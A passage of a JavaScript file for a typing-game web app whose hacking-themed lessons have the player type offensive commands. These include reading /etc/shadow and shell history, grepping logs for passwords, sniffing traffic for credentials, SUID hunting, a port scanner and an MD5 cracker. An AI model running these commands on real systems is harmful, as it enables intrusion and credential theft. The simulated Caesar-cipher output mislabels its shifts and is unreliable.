            description: `Given two strings <code>s</code> and <code>t</code>, return the minimum window substring of <code>s</code> such that every character in <code>t</code> (including duplicates) is included in the window.<br><br><pre><strong>Input:</strong> s = "ADOBECODEBANC", t = "ABC"
<strong>Output:</strong> "BANC"</pre>`,
            code: 'def min_window(s, t):\n    if t == "": return ""\n    countT, window = {}, {}\n    for c in t: countT[c] = 1 + countT.get(c, 0)\n    have, need = 0, len(countT); res, resLen = [-1, -1], float("inf"); l = 0\n    for r in range(len(s)):\n        c = s[r]; window[c] = 1 + window.get(c, 0)\n        if c in countT and window[c] == countT[c]: have += 1\n        while have == need:\n            if (r - l + 1) < resLen: res = [l, r]; resLen = (r - l + 1)\n            window[s[l]] -= 1\n            if s[l] in countT and window[s[l]] < countT[s[l]]: have -= 1\n            l += 1\n    l, r = res; return s[l : r + 1] if resLen != float("inf") else ""'
        },
        {
            name: 'Longest Valid Parens',
            difficulty: 'HARD',
            category: 'STACK',
            topics: ['STACK'],
            description: `Given a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring.<br><br><pre><strong>Input:</strong> s = ")()())"
<strong>Output:</strong> 4</pre>`,
            code: 'def longest_valid_parentheses(s):\n    stack = [-1]; res = 0\n    for i, c in enumerate(s):\n        if c == "(": stack.append(i)\n        else:\n            stack.pop()\n            if not stack: stack.append(i)\n            else: res = max(res, i - stack[-1])\n    return res'
        },
        {
            name: 'Sliding Window Max',
            difficulty: 'HARD',
            category: 'QUEUE',
            topics: ['QUEUE', 'SLIDING WINDOW'],
            description: `You are given an array of integers <code>nums</code>, there is a sliding window of size <code>k</code> which is moving from the very left of the array to the very right. Return the max sliding window.<br><br><pre><strong>Input:</strong> nums = [1,3,-1,-3,5,3,6,7], k = 3
<strong>Output:</strong> [3,3,5,5,6,7]</pre>`,
            code: 'from collections import deque\ndef max_sliding_window(nums, k):\n    output = []; q = deque(); l = r = 0\n    while r < len(nums):\n        while q and nums[q[-1]] < nums[r]: q.pop()\n        q.append(r)\n        if l > q[0]: q.popleft()\n        if (r + 1) >= k: output.append(nums[q[0]]); l += 1\n        r += 1\n    return output'
        }
    ];

    // Keywords per language for Syntax Glow
    const langKeywords = {
        text: [],
        python: ['def', 'class', 'if', 'elif', 'else', 'for', 'while', 'return', 'import', 'from', 'as', 'try', 'except', 'finally', 'raise', 'with', 'yield', 'lambda', 'pass', 'break', 'continue', 'and', 'or', 'not', 'in', 'is', 'None', 'True', 'False', 'async', 'await', 'assert', 'del', 'global', 'nonlocal', 'self', 'super', 'property'],
        javascript: ['function', 'const', 'let', 'var', 'if', 'else', 'for', 'while', 'return', 'import', 'export', 'from', 'class', 'extends', 'new', 'this', 'try', 'catch', 'finally', 'throw', 'async', 'await', 'yield', 'switch', 'case', 'break', 'default', 'typeof', 'instanceof', 'delete', 'void', 'null', 'undefined', 'true', 'false', 'of', 'in', 'get', 'set'],
        typescript: ['function', 'const', 'let', 'var', 'if', 'else', 'for', 'while', 'return', 'import', 'export', 'from', 'class', 'extends', 'implements', 'interface', 'type', 'new', 'this', 'try', 'catch', 'finally', 'throw', 'async', 'await', 'public', 'private', 'protected', 'readonly', 'abstract', 'enum', 'null', 'undefined', 'true', 'false', 'unknown', 'never', 'void', 'asserts'],
        c: ['int', 'char', 'float', 'double', 'void', 'long', 'short', 'unsigned', 'signed', 'const', 'static', 'extern', 'struct', 'typedef', 'enum', 'union', 'if', 'else', 'for', 'while', 'do', 'return', 'break', 'continue', 'switch', 'case', 'default', 'sizeof', 'NULL', 'include', 'define'],
        cpp: ['int', 'char', 'float', 'double', 'void', 'bool', 'auto', 'const', 'static', 'class', 'struct', 'public', 'private', 'protected', 'virtual', 'override', 'template', 'typename', 'namespace', 'using', 'new', 'delete', 'if', 'else', 'for', 'while', 'return', 'try', 'catch', 'throw', 'nullptr', 'true', 'false', 'include'],
        java: ['public', 'private', 'protected', 'static', 'final', 'abstract', 'class', 'interface', 'extends', 'implements', 'new', 'this', 'super', 'if', 'else', 'for', 'while', 'return', 'try', 'catch', 'finally', 'throw', 'throws', 'import', 'void', 'int', 'boolean', 'String', 'null', 'true', 'false', 'Override'],
        rust: ['fn', 'let', 'mut', 'const', 'if', 'else', 'for', 'while', 'loop', 'match', 'return', 'struct', 'impl', 'trait', 'enum', 'pub', 'use', 'mod', 'crate', 'self', 'super', 'async', 'await', 'move', 'ref', 'where', 'type', 'dyn', 'true', 'false', 'Some', 'None', 'Ok', 'Err', 'Self'],
        go: ['func', 'var', 'const', 'type', 'struct', 'interface', 'map', 'chan', 'if', 'else', 'for', 'range', 'switch', 'case', 'default', 'return', 'break', 'continue', 'go', 'defer', 'select', 'import', 'package', 'nil', 'true', 'false', 'error', 'string', 'int', 'float64', 'bool']
    };

    const bracketPairs = { '{': '}', '(': ')', '[': ']' };

    let codingState = {
        mode: null, // 'storm' or 'algo'
        lang: null,
        category: null,
        snippets: [],
        currentCode: '',
        charIndex: 0,
        correct: 0,
        total: 0,
        startTime: null,
        timerInterval: null,
        wpmInterval: null,
        timeLeft: 60,
        bigoLevel: 10,
        algoIndex: null,
        dsaIndex: null
    };

    // ── CODING MODE NAVIGATION ──
    function showCodingScreen(id) {
        document.querySelectorAll('#coding-ui .coding-screen').forEach(s => s.classList.add('hidden'));
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    }

    // ══════════════════════════════════════════════
    // TERMINAL_BREACH FUNCTIONS
    // ══════════════════════════════════════════════

    function renderBreachGrid() {
        const grid = document.getElementById('coding-breach-grid');
        grid.innerHTML = '';
        terminalBreachData.forEach((mission, idx) => {
            const card = document.createElement('div');
            card.className = 'coding-algo-card';
            card.innerHTML = `
                <div class="algo-card-name">${mission.name}</div>
                <div class="algo-card-meta">
                    <span class="algo-card-cat">${mission.category}</span>
                    <span class="algo-card-diff ${mission.difficulty.toLowerCase()}">${mission.difficulty}</span>
                </div>
            `;
            card.onclick = () => launchBreach(idx);
            grid.appendChild(card);
        });
    }

    // ASCII banners for missions
    const breachBanners = {
        BASH: `
 ┌─────────────────────────────────────────┐
 │  ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗ │
 │  ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝ │
 │  █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║    │
 │  ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║    │
 │  ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║    │
 │  ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    │
 │          [ Shell Exploitation Framework ]          │
 └─────────────────────────────────────────┘`,
        PYTHON: `
 ┌─────────────────────────────────────────┐
 │  ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗  │
 │  ██║   ██║██║██╔══██╗██║   ██║██╔════╝  │
 │  ██║   ██║██║██████╔╝██║   ██║███████╗  │
 │  ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║  │
 │   ╚████╔╝ ██║██║  ██║╚██████╔╝███████║  │
 │    ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝  │
 │       [ Python Payload Generator ]          │
 └─────────────────────────────────────────┘`
    };

    function launchBreach(idx) {
        const mission = terminalBreachData[idx];
        if (!mission) return;
        codingState.breachIndex = idx;
        codingState.currentCode = mission.code;

        showCodingScreen('coding-breach-board');

        // Clean up previous live output
        const oldOutput = document.querySelector('.term-live-output');
        if (oldOutput) oldOutput.remove();

        // Fake network details based on category
        const fakeIPs = {
            BASH: '10.0.0.' + (Math.floor(Math.random() * 254) + 1),
            PYTHON: '172.16.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 254),
        };
        const protos = { BASH: 'SSH', PYTHON: 'HTTP' };
        const ip = fakeIPs[mission.category] || '192.168.1.' + Math.floor(Math.random() * 254);
        const proto = protos[mission.category] || 'TCP';

        // Set fake port info
        const ports = { BASH: '22/tcp open  ssh     OpenSSH 8.9', PYTHON: '80/tcp open  http    Apache 2.4.52' };

        // Populate terminal history with lesson context
        const breachBoard = document.getElementById('coding-breach-board');
        const historyEl = breachBoard ? breachBoard.querySelector('.term-history') : null;
        if (historyEl) {
            const lessonText = mission.lesson || mission.description;
            historyEl.innerHTML =
                '<div class="term-history-line">' +
                '<span class="term-prompt-user">root@zen</span><span class="term-prompt-colon">:</span><span class="term-prompt-path">~</span><span class="term-prompt-dollar">$</span>' +
                '<span class="term-cmd"># ' + mission.name + '</span>' +
                '</div>' +
                '<div class="term-output-line term-lesson-text">' + lessonText + '</div>' +
                '<div class="term-history-line" style="margin-top:6px">' +
                '<span class="term-prompt-user">root@zen</span><span class="term-prompt-colon">:</span><span class="term-prompt-path">~</span><span class="term-prompt-dollar">$</span>' +
                '<span class="term-cmd">nmap -sV ' + ip + ' -p ' + (mission.category === 'BASH' ? '22' : '80') + '</span>' +
                '</div>' +
                '<div class="term-output-line">PORT   STATE SERVICE</div>' +
                '<div class="term-output-line"><span class="term-val">' + (ports[mission.category] || ports.BASH) + '</span></div>' +
                '<div class="term-history-line" style="margin-top:6px">' +
                '<span class="term-prompt-user">root@zen</span><span class="term-prompt-colon">:</span><span class="term-prompt-path">~</span><span class="term-prompt-dollar">$</span>' +
                '<span class="term-cmd"># Type the payload below to deploy</span>' +
                '</div>';
        }

        // Set elements that still exist in the DOM (outside of history)
        const titleEl = document.getElementById('breach-title');
        if (titleEl) titleEl.textContent = mission.name;
        const catEl = document.getElementById('breach-category');
        if (catEl) catEl.textContent = mission.category;
        const diffEl = document.getElementById('breach-difficulty');
        if (diffEl) {
            diffEl.textContent = mission.difficulty;
            diffEl.className = 'term-diff ' + mission.difficulty.toLowerCase();
        }

        document.getElementById('breach-wpm').textContent = '0';
        document.getElementById('breach-accuracy').textContent = '100%';
        document.getElementById('breach-progress-ascii').textContent = '[' + ' '.repeat(40) + '] 0%';

        // Live log ticker
        const log = document.getElementById('breach-log');
        log._25logged = false; log._50logged = false; log._75logged = false;
        log.textContent = '> Connection secure. Deploy when ready.';

        // Start matrix rain
        startMatrixRain();

        // Type interval
        if (codingState.wpmInterval) clearInterval(codingState.wpmInterval);
        codingState.wpmInterval = setInterval(updateBreachHUD, 300);

        const lang = mission.category === 'BASH' ? 'bash' : 'python';
        renderCodeBuffer(mission.code, 'breach-buffer', lang);

        initTypingEngine('breach-buffer', 'breach-input', () => {
            clearInterval(codingState.wpmInterval);
            stopMatrixRain();
            const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 0;
            if (acc === 100) {
                animateTerminalOutput(() => showBreachResults());
            } else {
                showBreachResults();
            }
        });

        // Ctrl+C abort listener
        if (codingState._breachAbortHandler) {
            document.removeEventListener('keydown', codingState._breachAbortHandler);
        }
        codingState._breachAbortHandler = function (e) {
            if (e.ctrlKey && e.key === 'c' && codingState.mode === 'breach') {
                e.preventDefault();
                abortBreach();
            }
        };
        document.addEventListener('keydown', codingState._breachAbortHandler);

        document.getElementById('breach-input').focus();
    }

    function abortBreach() {
        if (codingState.wpmInterval) { clearInterval(codingState.wpmInterval); codingState.wpmInterval = null; }
        stopMatrixRain();

        // Remove Ctrl+C listener
        if (codingState._breachAbortHandler) {
            document.removeEventListener('keydown', codingState._breachAbortHandler);
            codingState._breachAbortHandler = null;
        }

        // Show abort overlay
        const overlay = document.getElementById('breach-abort-overlay');
        if (overlay) {
            overlay.classList.remove('hidden');
            overlay.classList.add('active');

            // After animation, go back to mode select
            setTimeout(() => {
                overlay.classList.remove('active');
                overlay.classList.add('hidden');
                showCodingScreen('coding-mode-select');
            }, 2000);
        } else {
            showCodingScreen('coding-mode-select');
        }
    }

    function updateBreachHUD() {
        const correct = codingState.correct || 0;
        const total = codingState.total || 0;
        const charIdx = codingState.charIndex || 0;

        if (codingState.startTime) {
            const mins = (Date.now() - codingState.startTime) / 60000;
            const wpm = Math.round((correct / 5) / mins) || 0;
            const acc = total > 0 ? Math.round((correct / total) * 100) : 100;
            document.getElementById('breach-wpm').textContent = wpm;
            document.getElementById('breach-accuracy').textContent = acc + '%';
        }

        // ASCII progress bar
        const totalChars = codingState.currentCode ? codingState.currentCode.length : 0;
        const progress = totalChars > 0 ? Math.min(100, Math.round((charIdx / totalChars) * 100)) : 0;
        const filled = Math.round(progress / 100 * 40);
        const bar = '='.repeat(filled) + (filled < 40 ? '>' : '') + ' '.repeat(Math.max(0, 40 - filled - (filled < 40 ? 1 : 0)));
        document.getElementById('breach-progress-ascii').textContent = '[' + bar + '] ' + progress + '%';

        const log = document.getElementById('breach-log');
        if (progress >= 25 && !log._25logged) {
            log._25logged = true;
            log.innerHTML += '<div class="breach-log-line log-warn">[!] Firewall layer 1 bypassed</div>';
        }
        if (progress >= 50 && !log._50logged) {
            log._50logged = true;
            log.innerHTML += '<div class="breach-log-line log-warn">[!] Encryption layer cracked</div>';
        }
        if (progress >= 75 && !log._75logged) {
            log._75logged = true;
            log.innerHTML += '<div class="breach-log-line log-success">[+] Root access granted</div>';
        }
        log.scrollTop = log.scrollHeight;
    }

    // ── LIVE TERMINAL OUTPUT ANIMATION ──
    function animateTerminalOutput(callback) {
        const mission = terminalBreachData[codingState.breachIndex];
        const outputLines = mission && mission.output ? mission.output : [];
        if (outputLines.length === 0) { callback(); return; }

        const termBody = document.querySelector('#coding-breach-board .term-body');
        if (!termBody) { callback(); return; }

        // Create output container after the code area
        const outputDiv = document.createElement('div');
        outputDiv.className = 'term-live-output';
        const codeArea = termBody.querySelector('.breach-code-area');
        if (codeArea) {
            codeArea.after(outputDiv);
        } else {
            termBody.appendChild(outputDiv);
        }

        // Animate each line appearing
        let i = 0;
        function showNextLine() {
            if (i >= outputLines.length) {
                setTimeout(callback, 600);
                return;
            }
            const line = document.createElement('div');
            line.className = 'term-live-line';
            // Color code based on prefix
            const text = outputLines[i];
            if (text.startsWith('[+]')) {
                line.innerHTML = '<span class="term-out-success">' + text + '</span>';
            } else if (text.startsWith('[!]')) {
                line.innerHTML = '<span class="term-out-alert">' + text + '</span>';
            } else if (text.startsWith('[-]')) {
                line.innerHTML = '<span class="term-out-fail">' + text + '</span>';
            } else if (text.startsWith('[*]')) {
                line.innerHTML = '<span class="term-out-info">' + text + '</span>';
            } else {
                line.textContent = text;
            }
            outputDiv.appendChild(line);
            // Scroll to bottom
            termBody.scrollTop = termBody.scrollHeight;
            i++;
            setTimeout(showNextLine, 120 + Math.random() * 80);
        }

        // Small delay before output starts
        setTimeout(showNextLine, 300);
    }

    function showBreachResults() {
        const mins = codingState.startTime ? (Date.now() - codingState.startTime) / 60000 : 1;
        const correct = codingState.correct || 0;
        const total = codingState.total || 0;
        const wpm = Math.round((correct / 5) / mins) || 0;
        const acc = total > 0 ? Math.round((correct / total) * 100) : 100;
        const success = acc === 100;

        let rank = 'F';
        if (success) {
            if (wpm >= 80) rank = 'S+';
            else if (wpm >= 60) rank = 'S';
            else if (wpm >= 45) rank = 'A';
            else if (wpm >= 30) rank = 'B';
            else rank = 'C';
        }

        // Remove Ctrl+C listener
        if (codingState._breachAbortHandler) {
            document.removeEventListener('keydown', codingState._breachAbortHandler);
            codingState._breachAbortHandler = null;
        }

        // Fill breach overlay
        const titleEl = document.querySelector('.breach-complete-glitch');
        const subEl = document.querySelector('.breach-complete-sub');
        const overlay = document.getElementById('breach-complete-overlay');

        if (success) {
            titleEl.textContent = 'BREACH COMPLETE';
            titleEl.setAttribute('data-text', 'BREACH COMPLETE');
            subEl.textContent = 'root@target:~$ access_granted --full-control';
            overlay.classList.remove('breach-failed');
            overlay.classList.add('breach-success');
        } else {
            titleEl.textContent = 'BREACH FAILED';
            titleEl.setAttribute('data-text', 'BREACH FAILED');
            subEl.textContent = '> ERROR: payload corrupted — too many bad keystrokes';
            overlay.classList.remove('breach-success');
            overlay.classList.add('breach-failed');
        }

        document.getElementById('bc-wpm').textContent = wpm;
        document.getElementById('bc-accuracy').textContent = acc + '%';
        document.getElementById('bc-chars').textContent = correct;
        document.getElementById('bc-rank').textContent = rank;

        // Log output
        const mission = terminalBreachData[codingState.breachIndex];
        const logEl = document.getElementById('bc-log-output');
        logEl.innerHTML = '';
        const logLines = success ? [
            '[+] Payload deployed successfully',
            '[+] Target compromised — ' + (mission ? mission.name : 'Unknown'),
            '[+] Exfiltrated ' + correct + ' bytes in ' + (mins * 60).toFixed(1) + 's',
            '[+] Connection closed cleanly'
        ] : [
            '[-] Payload integrity check FAILED',
            '[-] ' + (total - correct) + ' corrupted bytes detected',
            '[-] Target firewall rejected payload',
            '[-] Connection terminated by remote host'
        ];
        logLines.forEach((line, i) => {
            setTimeout(() => {
                logEl.innerHTML += '<div class="bc-log-line">' + line + '</div>';
            }, i * 400);
        });

        // Wire buttons
        document.getElementById('bc-retry-btn').onclick = () => {
            hideBreachComplete();
            launchBreach(codingState.breachIndex);
        };
        document.getElementById('bc-exit-btn').onclick = () => {
            hideBreachComplete();
            showCodingScreen('coding-breach-select');
        };

        // Show overlay
        overlay.classList.remove('hidden');
        setTimeout(() => overlay.classList.add('active'), 50);
    }

    function hideBreachComplete() {
        const overlay = document.getElementById('breach-complete-overlay');
        if (overlay) {
            overlay.classList.remove('active');
            overlay.classList.add('hidden');
        }
    }

    const terminalBreachData = [
        // ═══════════ EASY — Lessons 1-10: Basics ═══════════
        {
            name: 'Lesson 1: Your First Recon',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Learn who you are on the system',
            lesson: 'Every hack starts with recon. whoami shows your username, id shows your privileges, and hostname reveals the machine name. These are the first 3 commands you run after gaining access to any system.',
            code: 'whoami && id && hostname',
            output: ["root", "uid=0(root) gid=0(root) groups=0(root)", "target-svr-01"]
        },
        {
            name: 'Lesson 2: Mapping the Filesystem',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Navigate and list directory contents',
            lesson: 'ls -la shows all files including hidden ones (dotfiles) with permissions, ownership, and sizes. The -a flag reveals hidden files that admins try to keep secret. pwd tells you exactly where you are.',
            code: 'pwd && ls -la /home/',
            output: ["/root", "total 28K", "drwx------  4 root root 4096 Mar  3 09:12 .", "drwxr-xr-x 18 root root 4096 Feb 28 14:33 ..", "-rw-------  1 root root  412 Mar  3 08:55 .bash_history", "drwx------  2 root root 4096 Mar  1 17:20 .ssh", "drwxr-xr-x  2 admin admin 4096 Feb 27 11:00 admin", "drwxr-xr-x  3 www   www   4096 Mar  2 22:14 www-data"]
        },
        {
            name: 'Lesson 3: Reading Secret Files',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Read file contents with cat, head, and tail',
            lesson: 'cat prints entire file contents. head shows the first N lines, tail shows the last N. Attackers use these to quickly scan config files and logs for credentials, API keys, and database passwords.',
            code: 'cat /etc/hostname && head -5 /etc/passwd && tail -3 /etc/shadow',
            output: ["target-svr-01", "root:x:0:0:root:/root:/bin/bash", "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", "bin:x:2:2:bin:/bin:/usr/sbin/nologin", "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "admin:x:1000:1000:Admin:/home/admin:/bin/bash", "$6$rounds=5000$salt$hashed_password_root", "$6$rounds=5000$salt$hashed_password_admin", "$6$rounds=5000$salt$hashed_password_www"]
        },
        {
            name: 'Lesson 4: Finding Hidden Files',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Search the filesystem with find',
            lesson: 'The find command searches directories recursively. -name filters by filename, -type f means files only. 2>/dev/null suppresses permission errors so your scan stays clean and quiet.',
            code: 'find / -name "*.conf" -type f 2>/dev/null | head -20',
            output: ["/etc/ssh/sshd_config", "/etc/apache2/apache2.conf", "/etc/mysql/my.cnf", "/etc/nginx/nginx.conf", "/etc/vsftpd.conf", "/etc/samba/smb.conf", "/var/www/html/wp-config.php", "/opt/app/config/database.conf", "/home/admin/.config/app.conf", "[+] 9 config files found"]
        },
        {
            name: 'Lesson 5: Network Recon',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Discover your network position and interfaces',
            lesson: 'ip addr shows all network interfaces and their IP addresses. This tells you which networks you can reach. ss -tulpn shows all listening ports and which programs own them — essential for finding attack surfaces.',
            code: 'ip addr show && ss -tulpn',
            output: ["1: lo: <LOOPBACK,UP> mtu 65536", "    inet 127.0.0.1/8 scope host lo", "2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500", "    inet 10.0.0.42/24 brd 10.0.0.255 scope global eth0", "3: wlan0: <BROADCAST,MULTICAST> mtu 1500", "Netid  State  Local Address:Port", "tcp    LISTEN 0.0.0.0:22", "tcp    LISTEN 0.0.0.0:80", "tcp    LISTEN 127.0.0.1:3306", "tcp    LISTEN 0.0.0.0:8080"]
        },
        {
            name: 'Lesson 6: Port Scanning with Nmap',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Scan a target for open ports and services',
            lesson: 'nmap is the most important recon tool. -sV detects service versions, -p- scans all 65535 ports. Open ports are entry points — each one runs a service that might have vulnerabilities you can exploit.',
            code: 'nmap -sV -p 22,80,443,3306,8080 10.0.0.1',
            output: ["Starting Nmap 7.94 ( https://nmap.org )", "Nmap scan report for 10.0.0.1", "Host is up (0.0031s latency).", "PORT     STATE SERVICE  VERSION", "22/tcp   open  ssh      OpenSSH 8.9p1", "80/tcp   open  http     Apache httpd 2.4.52", "443/tcp  open  ssl/http nginx 1.18.0", "3306/tcp open  mysql    MySQL 8.0.32", "8080/tcp open  http     Node.js Express", "Service detection performed. 5 services scanned."]
        },
        {
            name: 'Lesson 7: Credential Hunting',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Search logs and configs for passwords',
            lesson: 'grep searches text inside files. -r means recursive, -i means case-insensitive. Lazy admins leave passwords in config files, log files, and shell history. Always check these locations first.',
            code: 'grep -ri "password" /var/log/ 2>/dev/null && cat ~/.bash_history',
            output: ["/var/log/auth.log:Failed password for admin from 192.168.1.105", "/var/log/auth.log:Accepted password for root from 10.0.0.1", "/var/log/apache2/error.log:PHP Warning: password mismatch", "/var/log/mysql/error.log:Access denied for user root@localhost", "--- .bash_history ---", "mysql -u root -p Password123!", "ssh admin@10.0.0.50", "curl -u admin:letmein http://192.168.1.1/api", "[!] Credentials found in bash history!"]
        },
        {
            name: 'Lesson 8: User Enumeration',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'List system users and their privileges',
            lesson: '/etc/passwd contains all user accounts. cut extracts specific fields — field 1 is username, field 7 is their shell. Users with /bin/bash can log in interactively. Root (UID 0) has full system control.',
            code: 'cat /etc/passwd | cut -d: -f1,3,7 | sort -t: -k2 -n',
            output: ["root:0:/bin/bash", "daemon:1:/usr/sbin/nologin", "bin:2:/usr/sbin/nologin", "sys:3:/usr/sbin/nologin", "www-data:33:/usr/sbin/nologin", "nobody:65534:/usr/sbin/nologin", "sshd:106:/usr/sbin/nologin", "mysql:107:/bin/false", "admin:1000:/bin/bash", "dev:1001:/bin/bash", "[+] 3 interactive shells found: root, admin, dev"]
        },
        {
            name: 'Lesson 9: Process Monitoring',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Find running processes and their owners',
            lesson: 'ps aux lists every running process with its owner and resource usage. Attackers look for processes running as root, database services, web servers, and cron jobs that might be exploitable.',
            code: 'ps aux --sort=-%cpu | head -15 && echo "---" && ps aux | grep root',
            output: ["USER       PID %CPU %MEM COMMAND", "root         1  0.0  0.1 /sbin/init", "root       412  2.1  1.2 /usr/sbin/apache2", "mysql      538  5.3  8.4 /usr/sbin/mysqld", "root       612  0.8  0.3 /usr/sbin/sshd", "www-data   715  1.2  2.1 /usr/sbin/apache2", "root       823  0.0  0.1 /usr/sbin/cron", "admin      901  3.7  4.2 node /opt/app/server.js", "---", "[*] 4 root processes, 1 mysql, 1 node app running"]
        },
        {
            name: 'Lesson 10: Privilege Escalation Recon',
            difficulty: 'EASY',
            category: 'BASH',
            description: 'Find SUID binaries and kernel version for exploits',
            lesson: 'SUID binaries run with the file owner\'s permissions (often root). If you find a vulnerable SUID binary, you can escalate from a normal user to root. uname -a reveals the kernel version — old kernels have known exploits.',
            code: 'uname -a && find / -perm -4000 -type f 2>/dev/null',
            output: ["Linux target-svr-01 5.4.0-42-generic #46-Ubuntu x86_64", "--- SUID Binaries ---", "/usr/bin/sudo", "/usr/bin/pkexec", "/usr/bin/passwd", "/usr/bin/chfn", "/usr/bin/newgrp", "/usr/bin/find", "/usr/bin/vim.basic", "[!] /usr/bin/find has SUID — GTFOBins exploit available!", "[!] /usr/bin/vim.basic has SUID — can spawn root shell!"]
        },

        // ═══════════ MEDIUM — Lessons 11-20: Intermediate ═══════════
        {
            name: 'Lesson 11: SSH Remote Access',
            difficulty: 'MEDIUM',
            category: 'BASH',
            description: 'Connect to remote systems via SSH',
            lesson: 'SSH (Secure Shell) gives you encrypted remote access. -p specifies the port, -i uses a private key file. Once connected, you have a shell on the target as if you were sitting at the keyboard.',
            code: 'ssh -p 22 -i ~/.ssh/id_rsa admin@10.0.0.42',
            output: ["The authenticity of host '10.0.0.42 (10.0.0.42)' can't be established.", "ED25519 key fingerprint is SHA256:xK3a9bF2nQ...", "Are you sure you want to continue connecting? yes", "Warning: Permanently added '10.0.0.42' (ED25519) to known hosts.", "Welcome to Ubuntu 22.04.1 LTS", "Last login: Mon Mar  3 08:15:22 2026 from 10.0.0.1", "admin@target-svr-01:~$ ", "[+] SSH session established"]
        },
        {
            name: 'Lesson 12: Packet Sniffing',
            difficulty: 'MEDIUM',
            category: 'BASH',
            description: 'Intercept network traffic with tcpdump',
            lesson: 'tcpdump captures raw network packets. -i selects the interface, -c limits packet count, -w saves to a file. On unsecured networks, you can capture passwords, cookies, and API tokens in plaintext.',
            code: 'tcpdump -i eth0 -c 100 -w capture.pcap && tcpdump -r capture.pcap -A | grep -i "pass"',
            output: ["tcpdump: listening on eth0, link-type EN10MB", "09:15:22.341 IP 10.0.0.42.22 > 10.0.0.1.48302: Flags [P.]", "09:15:22.512 IP 192.168.1.105.443 > 10.0.0.42.37210: Flags [S]", "09:15:23.001 IP 10.0.0.42.80 > 192.168.1.50.52114: Flags [P.]", "100 packets captured", "--- Searching for credentials ---", "GET /login?user=admin&pass=admin123 HTTP/1.1", "Authorization: Basic YWRtaW46cGFzc3dvcmQ=", "[!] Plaintext credentials intercepted!"]
        },
        {
            name: 'Lesson 13: Web Recon with cURL',
            difficulty: 'MEDIUM',
            category: 'BASH',
            description: 'Probe web servers and read HTTP headers',
            lesson: 'curl makes HTTP requests from the terminal. -I fetches headers only, -v shows the full request/response. Headers reveal server software, security policies, and sometimes internal IP addresses.',
            code: 'curl -I -v http://target.local && curl -s http://target.local/robots.txt',
            output: ["HTTP/1.1 200 OK", "Server: Apache/2.4.52 (Ubuntu)", "X-Powered-By: PHP/8.1.2", "Set-Cookie: PHPSESSID=abc123; path=/", "Content-Type: text/html; charset=UTF-8", "--- robots.txt ---", "User-agent: *", "Disallow: /admin/", "Disallow: /backup/", "Disallow: /config/", "[!] Hidden directories found in robots.txt!"]
        },
        {
            name: 'Lesson 14: Python Port Scanner',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
            description: 'Build your own port scanner from scratch',
            lesson: 'socket.connect_ex() attempts a TCP connection and returns 0 if the port is open. By scanning a range of ports, you map the target\'s attack surface. Setting a timeout prevents hanging on filtered ports.',
            code: 'import socket\ndef scan(host, ports):\n    for p in ports:\n        s = socket.socket()\n        s.settimeout(0.5)\n        if s.connect_ex((host, p)) == 0:\n            print(f"[+] Port {p} is OPEN")\n        s.close()\nscan("10.0.0.1", range(1, 1025))',
            output: ["[*] Scanning 10.0.0.1...", "[+] Port 22 is OPEN", "[+] Port 80 is OPEN", "[+] Port 443 is OPEN", "[+] Port 993 is OPEN", "[*] Scan complete. 4 open ports found."]
        },
        {
            name: 'Lesson 15: Hash Cracking Basics',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
            description: 'Identify and crack password hashes',
            lesson: 'Passwords are stored as hashes — one-way mathematical functions. MD5 is 32 chars, SHA1 is 40, SHA256 is 64. If you can identify the hash type, you can try cracking it with a wordlist of common passwords.',
            code: 'import hashlib\ndef crack_md5(target_hash, wordlist):\n    for word in wordlist:\n        if hashlib.md5(word.encode()).hexdigest() == target_hash:\n            return f"[+] Cracked: {word}"\n    return "[-] Not found"\ncommon = ["admin", "password", "123456", "root", "letmein"]\nhash_val = hashlib.md5(b"password").hexdigest()\nprint(f"Hash: {hash_val}")\nprint(crack_md5(hash_val, common))',
            output: ["Hash: 5f4dcc3b5aa765d61d8327deb882cf99", "[*] Trying: admin       -> 21232f297a57a5a743894a0e4a801fc3  ✗", "[*] Trying: password    -> 5f4dcc3b5aa765d61d8327deb882cf99  ✓", "[+] Cracked: password", "[+] Hash type: MD5", "[+] Time: 0.002s"]
        },
        {
            name: 'Lesson 16: Caesar Cipher Cracker',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
            description: 'Break simple substitution ciphers',
            lesson: 'Caesar cipher shifts each letter by N positions. Since there are only 25 possible shifts, you can brute-force all of them instantly. This is why simple ciphers are useless for real security.',
            code: 'def crack_caesar(ciphertext):\n    for shift in range(1, 26):\n        result = ""\n        for c in ciphertext:\n            if c.isalpha():\n                base = ord("A") if c.isupper() else ord("a")\n                result += chr((ord(c) - base + shift) % 26 + base)\n            else:\n                result += c\n        print(f"[Shift {shift:02d}] {result}")\ncrack_caesar("Khoor Zruog")',
            output: ["[Shift 01] Lipps Asvph", "[Shift 02] Mjqqt Btwqi", "[Shift 03] Nkrru Cuxrj", "[Shift 24] Jgnnq Yqtnf", "[Shift 25] Hello World  ◄ DECODED", "[+] Plaintext found at shift 25!"]
        },
        {
            name: 'Lesson 17: Subdomain Enumeration',
            difficulty: 'MEDIUM',
            category: 'PYTHON',
